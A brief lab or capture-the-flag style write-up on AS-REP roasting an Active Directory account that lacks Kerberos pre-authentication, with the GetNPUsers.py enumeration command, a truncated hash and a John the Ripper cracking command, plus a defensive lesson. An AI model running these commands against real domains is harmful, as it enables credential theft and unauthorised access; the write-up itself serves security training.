Category: Active Directory / Kerberos
Difficulty: Hard

Summary:The domain had Kerberos pre-auth disabled for one user, making it vulnerable to AS-REP roasting. Extracted the hash and cracked it offline.

Steps:
# Enumerate users
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10
# Found AS-REP hash
$krb5asrep$23$...
# Cracked it
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

Lesson: Disable legacy settings like pre-auth exemption. Enforce modern authentication policies.
